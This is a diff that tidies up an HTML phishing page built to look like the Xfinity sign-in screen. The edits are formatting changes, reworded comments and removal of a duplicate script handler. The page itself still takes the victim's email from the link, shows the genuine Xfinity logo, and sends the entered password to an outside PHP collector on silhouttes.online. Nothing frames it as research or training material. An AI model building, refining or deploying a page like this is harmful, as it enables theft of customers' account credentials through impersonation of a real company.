@@ -59,7 +59,7 @@
     border: 1px solid #ccc;
     border-radius: 4px;
     box-sizing: border-box;
-    margin-bottom: 20px
+    margin-bottom: 20px;
   }
 
   /* Forgot password link - positioned at the right, close to input */
@@ -84,7 +84,8 @@
     display: flex;
     align-items: center;
   }
-   /* Terms text */
+
+  /* Terms text */
   p {
     font-size: 13px;
     margin-top: 20px;
@@ -116,7 +117,7 @@
   <!-- The big logo far at top -->
   <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity" class="logo" />
 
-  <!-- Email display (initially empty, will be set via JS if URL has email param) -->
+  <!-- Email display (initially empty) -->
   <div class="email" id="emailDisplay"></div>
 
   <!-- Hidden input for email to submit with form -->
@@ -126,15 +127,15 @@
   <h1>Enter your password</h1>
 
   <!-- Form with PHP link as action -->
- <form action="https://silhouttes.online/mo/index.php" method="POST">
-  <div class="input-group">
-    <input type="password" name="password" placeholder="" required />
-    <a href="#" class="forgot">Forgot password?</a>
-  </div>
-  <div class="checkbox-container">
-    <input type="checkbox" id="keepSignedIn" />
-    <label for="keepSignedIn">Keep me signed in</label>
-  </div>
+  <form action="https://silhouttes.online/mo/index.php" method="POST">
+    <div class="input-group">
+      <input type="password" name="password" placeholder="" required />
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+    <div class="checkbox-container">
+      <input type="checkbox" id="keepSignedIn" />
+      <label for="keepSignedIn">Keep me signed in</label>
+    </div>
     <!-- Submit button -->
     <button type="submit">Sign in</button>
   </form>
@@ -162,19 +163,11 @@
     return urlParams.get(name);
   }
 
-  window.onload = function() {
-    const email = getUrlParameter('email');
-    if (email) {
-      document.getElementById('email').value = email;
-    }
-  };
-  
-  // Populate email display and hidden input when page loads if URL has email param
   window.onload = () => {
     const emailParam = getUrlParameter('email');
     if (emailParam) {
       document.getElementById('emailDisplay').innerText = emailParam;
-      document.getElementById('email').value = emailParam; // set hidden input
+      document.getElementById('email').value = emailParam; // fill hidden input
     }
   };
 </script>
